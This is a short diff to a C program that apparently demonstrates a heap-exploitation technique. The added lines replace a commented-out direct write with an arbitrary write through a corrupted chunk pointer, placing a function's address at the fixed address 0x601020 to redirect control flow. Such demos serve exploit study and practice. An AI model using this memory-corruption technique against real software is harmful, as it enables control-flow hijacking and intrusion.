@@ -26,6 +26,7 @@ int main()
     printf("&chunk0_ptr: %p\n", &chunk0_ptr);
     printf("chunk0_ptr: %p\n", chunk0_ptr);
     printf("sizeof(size_t): %ld\n", sizeof(size_t));
+    printf("sizeof(uint64_t): %ld\n", sizeof(uint64_t));
 
     chunk0_ptr[0] = 0;
     chunk0_ptr[1] = sizeof(size_t);
@@ -40,7 +41,8 @@ int main()
     
     printf("chunk0_ptr: %p\n", chunk0_ptr);
 
-    //*(uint64_t*)0x601020 = (uint64_t)babo;
+    *(chunk0_ptr+3) = 0x601020LL;
+    *chunk0_ptr = (uint64_t)babo;
 
     puts("Done.");
 
